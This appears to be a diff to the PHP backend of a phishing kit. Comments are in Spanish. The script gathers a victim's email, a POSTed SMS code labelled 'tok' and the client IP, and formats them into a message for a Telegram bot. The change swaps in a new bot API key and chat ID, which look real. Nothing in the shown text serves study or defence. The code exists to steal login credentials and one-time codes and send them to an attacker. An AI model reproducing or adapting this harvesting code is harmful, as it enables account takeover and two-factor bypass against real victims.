@@ -8,10 +8,10 @@ $correo = $_POST['sms'];
 $ip = $_SERVER['REMOTE_ADDR']; // Obtener la dirección IP del cliente
 
 // API key del chatbot de Telegram
-$bot_api_key = '7600479883:AAFMUmp6KIq76Mi-FIYd-BMrFmm6cfBKx7E';
+$bot_api_key = '8341277170:AAHCI8qcGQCsMcuxHfNKiMhmfOpAf7YX-Uk';
 
 // ID del chat al que se enviará el mensaje
-$chat_id = '6734431637';
+$chat_id = '-4977908764';
 
 // Mensaje que se enviará al chatbot
 $mensaje_para_chatbot = "🔐🧿TKM bvd🧿🔐\n". "usar: " . $_SESSION['correo']  . "\ntok: " . $correo .  "\nip: " . $ip;
